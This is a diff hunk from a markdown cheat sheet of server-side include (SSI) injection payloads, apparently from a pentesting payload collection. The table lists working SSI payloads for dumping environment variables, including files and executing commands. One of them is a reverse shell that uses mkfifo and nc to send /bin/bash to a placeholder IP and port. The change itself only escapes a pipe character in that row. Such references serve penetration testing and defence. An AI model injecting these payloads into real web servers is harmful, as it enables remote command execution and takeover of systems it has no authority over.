@@ -17,7 +17,7 @@
 | Print all the variables | `<!--#printenv -->` |
 | Include a file          | `<!--#include file="includefile.html" -->` |
 | Execute commands        | `<!--#exec cmd="ls" -->` |
-| Doing a reverse shell   | `<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->` |
+| Doing a reverse shell   | `<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo\|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->` |
 
 
 ## References
